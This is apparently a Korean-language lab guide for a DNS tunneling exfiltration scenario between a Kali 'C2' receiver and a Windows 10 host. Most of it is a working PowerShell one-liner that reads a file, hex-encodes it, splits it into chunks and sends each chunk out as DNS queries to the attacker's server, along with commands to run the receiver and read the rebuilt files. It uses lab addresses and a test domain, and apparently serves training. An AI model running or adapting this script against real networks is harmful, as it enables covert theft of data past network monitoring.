# 공격 시나리오 — DNS 터널링

## 순서

1. **Kali**에서 수신 서버 실행
2. **Win10**에서 유출 스크립트 실행
3. **Kali**에서 복원된 파일 확인

---

## kali/ — C2 수신 서버

**실행 환경:** Kali (192.168.200.10)

```bash
sudo python3 kali_dns_server.py
```

결과 확인:
```bash
cat /tmp/exfil/exfil_*.bin
```

---

## win10/ — DNS 터널링 유출

**실행 환경:** Win10 (192.168.100.20)

유출 대상 파일 생성:
```powershell
"SECRET DATA" | Out-File -Encoding utf8 C:\Users\NSELab\Desktop\exfil_target.txt
```

유출 실행 (한줄 버전):
```powershell
$f="C:\Users\NSELab\Desktop\exfil_target.txt"; $s="192.168.100.53"; $d="tunnel.lab.test"
$b=[IO.File]::ReadAllBytes($f); $h=-join($b|%{$_.ToString("x2")})
$c=@(); for($i=0;$i -lt $h.Length;$i+=50){$c+=$h.Substring($i,[Math]::Min(50,$h.Length-$i))}
Resolve-DnsName -Name ("start{0:x4}{1:x4}.$d" -f $c.Count,$b.Length) -Server $s -Type A -EA 0
for($i=0;$i -lt $c.Count;$i++){Resolve-DnsName -Name ("{0:x4}{1}.$d" -f $i,$c[$i]) -Server $s -Type A -EA 0; sleep -m 300}
Resolve-DnsName -Name ("end{0:x4}.$d" -f $c.Count) -Server $s -Type A -EA 0
Write-Host "완료"
```

## 동작 원리

- 파일을 hex 인코딩 후 50자씩 분할
- 각 청크를 `{seq}{hex}.tunnel.lab.test` DNS 쿼리로 전송
- Gateway의 dnsmasq가 Kali로 포워딩
- Kali가 쿼리를 파싱해 파일 복원
